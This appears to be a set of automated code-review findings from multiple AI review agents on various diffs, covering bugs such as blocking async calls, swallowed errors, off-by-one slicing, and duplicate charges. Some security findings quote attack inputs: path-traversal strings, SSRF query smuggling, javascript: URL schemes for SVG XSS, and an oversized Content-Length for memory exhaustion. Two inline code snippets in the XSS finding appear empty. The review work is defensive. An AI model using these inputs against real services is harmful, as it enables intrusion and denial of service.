findings.body: The `apply_coupon()` function now raises `CouponExpired` when a coupon has expired, but there is no docstring documenting this exception or the `expires_at` dependency. A caller reading only the function signature could pass an expired coupon and be surprised by the exception. Add a docstring documenting the new exception case and the `expires_at` requirement.

findings.title: Blocking requests.get inside async def stalls the event loop
findings.body:
`fetch_plan_limits` is declared `async` but its body contains no `await`; it calls the synchronous `requests.get`, which blocks the calling thread until the HTTP call completes or the 5s timeout fires. In an asyncio server this blocks the entire event loop, so every other in-flight request on that worker stalls for the duration — the opposite of what the `async` keyword suggests to callers who `await` it.

Use the existing httpx async path instead, mirroring `fetch_plan` on lines 5-7: accept an `httpx.AsyncClient` (or create one in an `async with`) and `await client.get(...)`. If a synchronous client is genuinely required, run it via `asyncio.to_thread`/`run_in_executor` rather than calling it directly on the loop, and drop the now-unneeded `requests` import on line 2.

findings.title: No test covers fetch_plan_limits or its blocking-call behavior
findings.body: fetch_plan_limits is declared async but uses the synchronous `requests` library, which will block the event loop for up to 5 seconds under load. There is no test in this diff exercising this function, so nothing would fail or flag the blocking-call regression if this were wrong (e.g. if it froze concurrent request handling). A test that runs this coroutine concurrently with another task and asserts the other task isn't delayed would catch this class of bug.

findings.title: Unvalidated tenant_id interpolated into internal billing URL path
findings.body:
`tenant_id` is f-string-interpolated into the path of an internal, presumably unauthenticated-by-network-position service (`https://billing.internal/limits/{tenant_id}`) with no validation or percent-encoding. If `tenant_id` reaches this function from request data (path/query/body/JSON), a value such as `../../admin/keys` or `1?force=true` or `1/../../tenants` lets the caller reach other paths and query parameters on the internal billing host and have the JSON body returned to them — a server-side request forgery against an internal endpoint. `requests` also follows redirects by default, so a redirect from the billing host would be followed silently.

Fix: validate `tenant_id` against the expected shape (e.g. UUID or `^[0-9]+$`) before use, or `urllib.parse.quote(str(tenant_id), safe='')`, and consider `allow_redirects=False`. The same interpolation exists in `fetch_plan` on line 6, so the guard is best applied at the call sites or in a shared helper.

findings.title: Bare except swallows KeyboardInterrupt/SystemExit and logs nothing
findings.body:
`except:` with no exception class catches `BaseException`, so `KeyboardInterrupt`, `SystemExit` and `GeneratorExit` are caught and discarded here — Ctrl-C or a worker shutdown signal raised while inside `_client.send` will be silently converted into a normal `return None` instead of propagating. Narrow this to `except Exception:` (and, if the client has a typed transport error, prefer that). The PR description says "catch and log", but no logging call was added, so every push failure — network error, auth failure, serialization bug — now disappears with no trace at all. Add a `logger.warning(..., exc_info=True)` before returning.

_Also raised by the security agent:_ Bare except silently drops telemetry failures with no log

findings.title: Return type contract changed without documentation
findings.body: The function `push_metrics()` is a public API (based on its module-level placement and name suggesting external use). Previously it returned the result of `_client.send(payload)`, but now returns `None` on any exception. Callers relying on the return value for control flow or validation will silently get `None` instead of the expected result or exception. Either add a docstring documenting the new behavior (return type, exception handling policy), or document it through type hints.

findings.title: No test covers the new exception-swallowing behavior
findings.body: push_metrics now catches all exceptions from _client.send and returns None instead of propagating. There is no test in this diff verifying that (a) an exception from _client.send is suppressed and (b) push_metrics returns None in that case, or that it still returns the normal result on success. Without such a test, a future change that reintroduces a raise, or that fails to return None, would go undetected.

findings.title: Rate limit bypass: try_consume checks and updates outside _lock
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, yields control to the event loop with `await asyncio.sleep(0)` on line 18, and only then writes `_counters[tenant] = current + cost` on line 19 — all without holding `_lock`, which the sibling `consume` (line 9) does acquire.

Two consequences, both attacker-reachable by simply issuing requests concurrently (the normal capability of any network client):

1. Check-then-act bypass: N coroutines can all read the same `current`, all find `current + cost <= LIMIT`, and all return `True`, admitting up to N times the intended cost.
2. Lost update: because each writer stores its own `current + cost` rather than incrementing, concurrent calls overwrite each other. The counter permanently undercounts, so the bypass is not a one-off overshoot — a client that keeps requests in flight can keep the stored counter arbitrarily far below its real consumption and never be limited at all.

Fix by doing the whole read-check-write under the existing lock and removing the yield point between read and write:

```python
async def try_consume(tenant, cost):
    async with _lock:
        current = _counters.get(tenant, 0)
        if current + cost > LIMIT:
            return False
        _counters[tenant] = current + cost
        return True
```

Note the entry point that calls `try_consume` is not present in this diff or in the retrieved context, so I cannot name the concrete handler; the exploit requires only that some request path reaches it concurrently, which is the premise of a per-tenant limiter.

_Also raised by the correctness agent:_ try_consume checks and updates the counter without holding _lock

findings.title: New try_consume rate-limit path has no test coverage
findings.body: try_consume introduces the tenant rate-limiting behaviour this PR is meant to add, including a check-then-act sequence around a shared _counters dict without holding _lock (unlike consume). There is no test in this diff exercising try_consume's limit enforcement, its return value on success/failure, or concurrent-call behaviour. A regression that breaks limit enforcement (e.g. off-by-one on LIMIT, or the race under concurrent calls) would currently pass unnoticed.

findings.title: Docstring describes old tuple return, not new dict
findings.body:
The docstring states the function returns a tuple '(name, email)', but the implementation now returns a dict with keys 'name', 'email', and 'tier'. Callers relying on the docstring will unpack incorrectly. The existing caller in reports/weekly.py (name, email = lookup_user(user_id)) will break at runtime.

Update the docstring to match the new return type and document all keys in the dict.

_Also raised by the correctness agent:_ Docstring still advertises the removed (name, email) tuple contract

findings.title: Return shape change breaks existing tuple-unpacking caller
findings.body:
`lookup_user` now returns a dict instead of `(name, email)`. The existing caller `reports/weekly.py:render_row` does `name, email = lookup_user(user_id)`. Unpacking a dict iterates its keys, and this dict has three keys, so the call raises `ValueError: too many values to unpack (expected 2)` for every invocation — and even with two keys it would silently bind the strings "name"/"email" rather than the values. Either update all callers to index the dict (`u["name"], u["email"]`), or keep the tuple contract and add a separate function/`NamedTuple` that remains unpack-compatible.

_Also raised by the tests agent:_ Return-shape change breaks caller with no test to catch it

findings.title: WriteSettlement always returns nil after a failed insert
findings.body:
The `err` from `db.Exec` is scoped to the `if` statement on line 15 and is only logged. Lines 18-19 then declare a brand-new `var err error`, which is always nil, and return it. The result is that `WriteSettlement` reports success for every call that reaches the insert, whether or not the settlement row was actually written — a caller in the end-of-day batch has no way to distinguish a persisted settlement from a dropped one, and nothing will retry or reconcile it.

If the intent really is "log and continue", make that explicit at the call site rather than in the writer: return the error from `db.Exec` and let the batch loop decide to log and proceed. Otherwise, at minimum, return the captured error:

```go
if _, err := db.Exec(...); err != nil {
    log.Printf("settlement insert failed: %v", err)
    return err
}
return nil
```

Note also the contrast with `WriteEntry` directly above (line 7-8), which propagates its `Exec` error — callers reasonably assume the same contract here.

_Also raised by the docs agent:_ Public function hides errors from caller

findings.title: WriteSettlement has no test covering its error-return behavior
findings.body: WriteSettlement declares `var err error` and returns it unconditionally at line 19, so it always returns nil even when the db.Exec insert at line 15 fails (the failure is only logged). No test exists in this diff to exercise the failure path, so this always-succeeds behavior would go completely undetected — callers relying on a non-nil error to trigger retries or alerts on settlement failures would silently proceed as if the write succeeded.

findings.title: Mutable default argument accumulates failures across calls
findings.body:
`attempted=[]` is evaluated once at function definition time, so every call that omits the argument shares the same list object. Line 10 appends to it and line 11 returns it, so the second call returns the failures from the first call plus its own, and the list grows without bound for the process lifetime. Callers inspecting the return value to decide what to re-send will re-send recipients that already succeeded in a later batch, or mis-report the failure count.

Use `def send_with_retries(recipients, attempted=None):` and `attempted = list(attempted) if attempted is not None else []` at the top of the body.

_Also raised by the security agent:_ Mutable default arg leaks recipients across calls

_Also raised by the docs agent:_ Public function `send_with_retries` lacks contract documentation

findings.title: send_with_retries has no test covering repeated calls
findings.body: send_with_retries uses a mutable default argument `attempted=[]`, which will persist and accumulate across calls that don't pass their own list. There is no test in this diff exercising the function across multiple invocations, so this bug (a classic mutable-default-arg defect matching the PR's own title) would go undetected.

findings.title: compute_rounding silently changes half-cent boundary (>= 0.5 -> > 0.5)
findings.body:
This PR is described as a rename-only change, but `compute_rounding` also changes its comparison operator: the old body was `return 1 if line.remainder_cents >= 0.5 else 0`, the new one is `return 1 if line.remainder_cents > 0.5 else 0`. For the exact boundary input `remainder_cents == 0.5` the function now returns 0 where it previously returned 1 — i.e. exact half-cent remainders round down instead of up. In a billing package this is a money-affecting behaviour change: totals for any line with a 0.5 remainder shift by one cent, and it will not be caught by anyone reviewing this as a mechanical rename.

If the change is unintended, restore `>=`. If it is intended (e.g. switching to round-half-down), it should be split into its own commit with a test covering `remainder_cents == 0.5` and a note about the effect on existing invoices.

_Also raised by the tests agent:_ Rounding boundary condition changed under the guise of a rename

findings.title: page_of_sorted returns one fewer record than page_of
findings.body:
The function `page_of_sorted` uses `start + PAGE_SIZE - 1` on line 12, returning one fewer record per page than the established `page_of` function which uses `start + PAGE_SIZE`. This breaks the implicit contract that pagination functions return consistent page sizes. Callers expecting a full page will receive short pages, and the last record of each page is silently dropped. This should be `start + PAGE_SIZE` to match `page_of`.

_Also raised by the correctness agent:_ Off-by-one slice drops one record per page in page_of_sorted

findings.title: New page_of_sorted function has no test to catch its off-by-one slicing
findings.body: page_of_sorted is new behaviour (sorting plus pagination) and slices with `start + PAGE_SIZE - 1`, which returns PAGE_SIZE-1 records per page instead of PAGE_SIZE — the last record of each page is silently dropped. No test file is included in this diff, so nothing would fail if this off-by-one is wrong; a test asserting the returned page has exactly PAGE_SIZE records (and that the last page includes the final sorted record) is needed.

findings.title: Dropped None guard crashes on invoices without a purchase order
findings.body:
`Invoice.purchase_order` is typed `str | None` and documented as optional ("only set for customers on invoicing terms, which is roughly one account in twenty"). The removed `if invoice.purchase_order is not None:` guard was not redundant — the type annotation includes `None`, it does not exclude it. Calling `.upper()` on `None` raises `AttributeError: 'NoneType' object has no attribute 'upper'`, breaking header rendering for every invoice without a PO.

Restore the conditional, e.g. build the list and append the PO line only when `invoice.purchase_order is not None`.

_Also raised by the docs agent:_ Code contradicts documented nullable field contract

findings.title: No test covers header_lines with purchase_order=None
findings.body: header_lines now unconditionally calls invoice.purchase_order.upper(), which will raise AttributeError when purchase_order is None — a state the model docstring says occurs for roughly one in twenty customers. There is no test in this diff (or apparently in the repo) that calls header_lines with an invoice lacking a purchase_order, so this regression would ship without any test failing.

findings.title: File handle leaked on early return and on exception paths
findings.body:
`fh = open(path)` is not wrapped in a `with` block, and `fh.close()` on line 16 is only reached on the success path. When the header does not match, line 14 returns `None` with the handle still open; likewise any exception from `next(reader)` (line 12) or `list(reader)` (line 15) escapes without closing. Since header mismatch is the *expected* rejection path for partner catalogues, this leaks on every bad file — under CPython it is reclaimed by refcounting, but not deterministically on PyPy and not at all if the object is captured in a traceback frame.

Use the same pattern as `read_rows` on line 5: `with open(path) as fh:` and drop the explicit `close()`.

findings.title: New read_validated function has no tests
findings.body: read_validated introduces new branching behaviour (header mismatch returns None, otherwise returns parsed rows) and a manual file-handle lifecycle (fh.close() only reached on the success path). Nothing in this diff exercises either the mismatched-header return value or the fact that the file is left open when returning early at line 14. If the early-return path were wrong (e.g. leaking the handle, or returning the wrong sentinel), no test would catch it.

findings.title: Public function `read_validated` lacks documentation
findings.body: The function `read_validated` is exported at module level and has a non-obvious contract: it returns `None` on validation failure (line 14) but returns `rows` (a list) on success (line 16). A caller reading only the signature could not determine this asymmetric return type or the condition under which `None` is returned. Add a docstring explaining the parameters, the validation check performed, and the two possible return types.

findings.title: Retry wraps non-idempotent charge(), risking duplicate charges
findings.body:
`@retry(attempts=3)` is applied to `charge()`, but `billing/gateway.py` states plainly that `charge` is NOT idempotent: each call creates a new charge. A transient failure that occurs *after* the gateway has accepted the POST (timeout, connection reset, 5xx on the response path) will be retried and will create a second — and possibly third — charge against the customer's card. The retry on `fetch_charge` is fine because `get_charge` is a safe GET; this one is not equivalent.

The gateway docstring names the fix: pass an `Idempotency-Key` header, generated once per logical charge attempt and reused across retries, so the gateway collapses duplicates. Until `charge()` accepts and forwards such a key, this wrapper should not retry — or should retry only on errors that provably occurred before the request was sent.

_Also raised by the security agent:_ Retry on non-idempotent charge can double-charge (no Idempotency-Key)

findings.title: Retry wrapper on non-idempotent call lacks safety documentation
findings.body: The `charge_card` function wraps `charge`, which is explicitly documented as "NOT idempotent: each call creates a new charge." The retry decorator will make multiple calls if the gateway is flaky. Without an Idempotency-Key header (which the underlying `charge` function documents as required for safe retries), this function could silently create duplicate charges on retry. The function must either: (1) document that callers must pass an Idempotency-Key, (2) implement it internally, or (3) not retry this call. At minimum, document the idempotency requirement and constraint.

findings.title: Retry-wrapped non-idempotent charge call has no test coverage
findings.body: charge_card wraps billing.gateway.charge, which is explicitly documented as NOT idempotent (each call creates a new charge) and only safe to retry with an Idempotency-Key header. The new code retries it up to 3 times with no key logic and no test verifying retry behavior or duplicate-charge prevention. If this is wrong (e.g., causes duplicate charges on retry), nothing in the codebase would fail — there is no test exercising charge_card's retry semantics at all.

findings.title: Naive datetime subtracted from tz-aware expires_at raises TypeError
findings.body: `datetime.now()` returns a naive local datetime, but `Invite.expires_at` is documented as always tz-aware UTC. Subtracting a naive datetime from an aware one raises `TypeError: can't subtract offset-naive and offset-aware datetimes`, so `expires_within` fails on every invocation. Use `datetime.now(timezone.utc)` as `is_expired` on line 5 already does. (Even if it did not raise, using local wall-clock time against a UTC timestamp would silently skew the result by the UTC offset.)

findings.title: Timezone mismatch contradicts Invite.expires_at contract
findings.body: The `expires_within` function creates a timezone-naive `cutoff` via `datetime.now().replace(microsecond=0)` on line 9, then subtracts it from `invite.expires_at` on line 10. The repository documentation states that `expires_at` is always timezone-aware UTC. Subtracting a naive datetime from an aware datetime will raise `TypeError` at runtime. The function's contract is now inconsistent with the documented invariant that `expires_at` is timezone-aware.

findings.title: No test covers expires_within, which likely raises at runtime
findings.body: expires_within subtracts a tz-naive datetime.now() from invite.expires_at, which per the model docstring is always tz-aware. This mix raises TypeError in Python. There is no test in this diff exercising expires_within, so this defect would ship undetected. Add a test that calls expires_within with a real Invite-like object and asserts on the boolean result (not on a mock).

findings.title: contactEmail throws when billingContact is absent
findings.body:
`Account.billingContact` is declared optional (`billingContact?`) and documented as "Absent until the customer completes onboarding". `contactEmail` reads `.email` off it with no guard, so any account in the pre-onboarding state produces `TypeError: Cannot read properties of undefined (reading 'email')`. The sibling function two lines up (`bannerFor`) already handles this correctly with `?.` plus a `??` fallback, which confirms the absent case is reachable on this page. Mirror that: e.g. `return account.billingContact?.email.toLowerCase() ?? ""` — or change the return type to `string | undefined` / make the caller handle the missing case explicitly. Under `strictNullChecks` this should also fail to compile, so if it builds today that is worth checking too.

_Also raised by the docs agent:_ Public function's contract undocumented; unsafe assumption about optional field

findings.title: contactEmail has no test exercising the missing-billingContact case
findings.body: The new contactEmail function assumes account.billingContact is always present, but the Account type still marks billingContact as optional ("Absent until the customer completes onboarding."). No test file is included in this diff, so there is nothing that would fail if this assumption is wrong — a call with an account lacking billingContact would throw at runtime and no test would catch it.

findings.title: timeout=30 is 30 milliseconds, not 30 seconds
findings.body: `fetch()` documents `timeout` as being in MILLISECONDS ("Callers wanting seconds must multiply"). Passing `timeout=30` gives the partner API a 30ms budget, shared across the default `retries=3`, so a slow endpoint — which the PR description says this one is — will fail on essentially every nightly run. If 30 seconds was intended, pass `timeout=30_000`. Note also that the retry budget is shared, so the effective per-attempt window is even smaller than the value passed.

findings.title: Caller misunderstands fetch() timeout units
findings.body: The `fetch()` function's docstring explicitly states that `timeout` is in milliseconds. The call on line 9 passes `timeout=30`, which would be 30 milliseconds—far too short for any real API call. This indicates the author believes timeout is in seconds, contradicting the documented contract. Either the docstring's contract is being violated, or the value should be `30000` for 30 seconds. Given the PR description mentions "generously set" timeout for a slow API, 30 milliseconds is certainly wrong.

findings.title: New sync_partner_catalogue has no test covering its behavior
findings.body: sync_partner_catalogue() is new code with no accompanying test in this diff. Nothing exercises it, so if the call to fetch() is wrong (e.g. the timeout value being in the wrong unit, or the URL/retry behavior changing), no test would fail. A test asserting on the fetch call's timeout value (in milliseconds per clients/http.py's documented contract) would have caught that timeout=30 gives an effectively immediate timeout rather than the intended generous one.

findings.title: Duplicate index: same table and columns already indexed in 0007
findings.body: `invoices_tenant_recent_idx` on `invoices (tenant_id, created_at DESC)` is byte-for-byte the same definition as `invoices_tenant_created_idx`, created in migration 0007 and already applied (2025-11-02). `IF NOT EXISTS` matches on index *name* only, not on the indexed expression, so it will not suppress this — Postgres will happily build a second identical index. The result is duplicated storage and an extra index to maintain on every insert/update/delete of `invoices`, with no query benefit since the planner can already use the 0007 index for the tenant-filter/recency-sort pattern described in the PR. Drop this statement, or if the intent was to rename/replace the old index, do that explicitly and drop `invoices_tenant_created_idx`.

findings.title: Referer is logged unscrubbed, leaking the auth token into logs
findings.body:
The removed branch passed the Referer value through `_scrub_uri(value, extra_param_keys)` before adding it to the logged dict; the replacement copies `request.headers[header]` verbatim for every header including Referer. Per `jupyter_server/auth/identity.py`, notebook URLs are handed out as `{base}?token={token}`, so the browser sends that full URL — token included — in the Referer header of every subresource request. Any 5xx therefore writes a live auth token into the log at line 6, where it is readable by anyone with log access and typically shipped to aggregation systems. Restore the scrub for Referer (and any other URI-bearing header) rather than logging the raw value. Note also that `extra_param_keys` now appears unused in this function, which is a signal the sanitisation path was dropped rather than intentionally replaced.

_Also raised by the security agent:_ Referer logged unscrubbed, leaking auth token into server logs

_Also raised by the tests agent:_ No test guards against Referer token leaking into logs

findings.title: Dropping xlinkhref from link validation re-enables SVG XSS
findings.body: `validateProp` previously funnelled `href`, `src` and `xlinkhref` through `isAnchorLinkAllowed`, which rejects the `unsafeLinkPrefix` schemes (`javascript:`, `data:text/html`, `vbscript:`). After this change `xlinkhref` falls through to whatever the default branch does and is no longer checked against that allowlist. `xlink:href` is a live URL sink: `` executes on click in browsers that still honour the legacy attribute, and `` pulls in external content. Since the file header states the attributes come from author-supplied markdown that includes end-user submissions, an attacker who can post markdown can plant a stored XSS payload that fires for any viewer who clicks it. If the goal is to shrink the attribute surface, drop `xlinkhref` from the *allowed attributes* list entirely (so it is stripped) rather than from the *validation* branch (so it is passed through unvalidated). Restoring `|| attribute === 'xlinkhref'` is the minimal fix; a case-insensitive check covering `xlink:href` as authored would be better still. _Also raised by the correctness agent:_ Dropping xlinkhref skips URL scheme validation, re-enabling SVG XSS

findings.title: No test guards xlink:href attribute handling after removal
findings.body: The attribute check for 'xlinkhref' was removed, meaning values for that attribute no longer go through isAnchorLinkAllowed. There is no test in this diff (or referenced) that exercises validateProp with attribute === 'xlinkhref' and a dangerous value like 'javascript:...'. If this change is wrong (i.e., xlink:href can still be used to inject an unsafe URI into rendered SVG), nothing in the test suite would fail to reveal it.

findings.title: Removing ValidateID lets unvalidated project names reach buildPath
findings.body:
`projectQueryParameter` comes straight from the request query string and, after this change, is no longer checked by `common.ValidateID` before being used as a project name. The retrieved `DAO.buildPath` documents that it "does no validation of its own: callers are required to have validated the names before this point" and passes the value directly into `filepath.Join(d.Folder, project, kind)`. `filepath.Join` calls `Clean`, so a value such as `../../etc` resolves upward and escapes `d.Folder` entirely — the join does not scope anything, contrary to the PR description. It also removes the guarantee that the value is a valid identifier for any other backend that consumes it. Restore the `common.ValidateID(projectQueryParameter)` check (and the `HandleBadRequestError` response) before the value is used or compared.

_Also raised by the security agent:_ Removing ValidateID allows path traversal via project query param

findings.title: No test guards removal of project-name validation before buildPath
findings.body: The validation call to common.ValidateID(projectQueryParameter) was removed, and buildPath (per repo context) explicitly documents that it performs no validation itself and relies on callers to validate names. If this change is wrong — e.g. if a project name like '../../etc' is now passed straight through to filepath.Join — nothing in the visible diff or repository context shows a test that would catch a path-traversal-style project name reaching buildPath through this query-parameter branch. Add a test that exercises `list` with a malicious/invalid projectQueryParameter and asserts either an error is returned or the resulting path stays scoped under the folder root.

findings.title: Content-Length drives buffer pre-allocation (declared-length memory exhaustion)
findings.body:
`contentLength` on an S3 UploadPart request comes straight from the client's `Content-Length` header (or the equivalent field the S3 frontend parses out of it). Previously the pool-backed RW grew only as bytes actually arrived from `body`, so peak memory tracked the real payload. After this change the full declared size is reserved up front, before `io.Copy` has read a single byte, so a client can claim `Content-Length: 5368709120` and send one byte — or nothing — and still force the server to reserve gigabytes. Repeat across concurrent connections and the process OOMs; the attacker pays almost no bandwidth.

Suggested fixes: clamp the reservation to a sane ceiling (e.g. `min(contentLength, maxPartSize)` using the S3 5 GiB part cap or a configured limit), skip the reservation entirely when `contentLength` is negative or zero (chunked/unknown bodies typically report `-1`, and it is unclear from this diff whether `Reserve` tolerates a negative argument), and enforce that the bytes actually read (`n`) match the declared length before accepting the part.

_Also raised by the correctness agent:_ Buffer reserved from untrusted Content-Length before any body is read

_Also raised by the correctness agent:_ Unknown/absent Content-Length (-1) passed to Reserve unguarded

findings.title: No test covers Reserve(contentLength) behavior or edge cases
findings.body: The diff changes the multipart RW to pre-reserve capacity based on contentLength, which is derived from a client-supplied Content-Length header. There is no test in this diff (or referenced) that exercises this path with edge-case values such as a negative contentLength, a contentLength far larger than the actual body, or a mismatch between declared and actual length. If Reserve panics, over-allocates, or silently misbehaves on such inputs, nothing in the test suite would catch it — the change would ship with a false sense of safety, which is especially concerning since this PR's stated purpose is related to a declared-length allocation CVE.

findings.title: Default scheme flips from https to http when is_secure is unset
findings.body:
The old expression `"http" if request.meta.get("is_secure") is False else "https"` only selected plaintext on an explicit `False`; every other value — including the common case where `is_secure` is absent and `.get()` returns `None` — produced `https`. The new expression `"https" if request.meta.get("is_secure") else "http"` treats `None` (and any other falsy value) as a request for plaintext, so callers that never set `is_secure` now have their S3 request URL built as `http://...`, sending the AWS-signed request over an unencrypted channel. Restore the opt-out semantics, e.g. `scheme = "http" if request.meta.get("is_secure") is False else "https"`, or `scheme = "https" if request.meta.get("is_secure", True) else "http"` if the ternary form is preferred.

_Also raised by the docs agent:_ S3 scheme default changed from HTTPS to HTTP

findings.title: S3 requests default to plaintext HTTP after ternary inversion
findings.body:
The old expression `"http" if request.meta.get("is_secure") is False else "https"` was fail-secure: TLS was used unless a caller explicitly opted out with `is_secure=False`. The new expression `"https" if request.meta.get("is_secure") else "http"` is fail-open: `request.meta.get("is_secure")` returns `None` whenever the key is not set — which is the normal case for any request that did not deliberately configure it — so `scheme` becomes `"http"` and the URL built on line 6 is fetched over an unencrypted connection.

Consequences: the AWS request signature / `Authorization` header and any session token travel in cleartext, and the response body (private bucket contents) is exposed. A network-position attacker can read credentials and replay the signed request, or tamper with the returned object, which is then parsed by the spider.

Fix: restore the fail-secure form, e.g. `scheme = "http" if request.meta.get("is_secure") is False else "https"`, or if the simpler ternary is wanted, default the lookup: `request.meta.get("is_secure", True)`.

findings.title: Default scheme behavior change is untested
findings.body: The old code defaulted to https unless is_secure was explicitly False; the new code defaults to http unless is_secure is truthy. This flips the default for requests where is_secure is unset (None/missing), which affects whether S3 requests are sent over plaintext HTTP by default. No test file is present in this diff to verify scheme selection for the unset/None case, the True case, and the False case.

findings.title: DELETE now authorized as "push", bypassing the delete permission
findings.body:
`request.Method` (fully attacker-controlled, it is the verb on the inbound HTTP request) flows into `action`, which becomes the `ResourceAction` used for the access-control decision. The old switch mapped `http.MethodDelete` to `"delete"`; the new two-branch form maps everything that is not GET/HEAD — including DELETE — to `"push"`.

Per pkg/api/config/config.go the three actions are deliberately distinct: "an account may be allowed to push new tags without being allowed to delete existing ones." After this change any principal holding only `push` on a repository can issue `DELETE /v2/<name>/manifests/<ref>` and pass authorization, destroying existing tags/blobs. Equivalently, the `delete` grant becomes unreachable and meaningless.

Restore the explicit `case http.MethodDelete: action = "delete"` branch (or an equivalent `if m == http.MethodDelete` before the push assignment) so the delete permission is still consulted.

_Also raised by the correctness agent:_ DELETE now authorizes as "push", bypassing the delete permission

findings.title: Documented ActionDelete is now unreachable
findings.body: The code previously mapped http.MethodDelete to an 'delete' action, as documented in pkg/api/config/config.go. This diff collapses all non-GET/HEAD methods to 'push', making the documented ActionDelete contract impossible to reach. Callers relying on the documented three-action system will not get the 'delete' action they expect for DELETE requests.
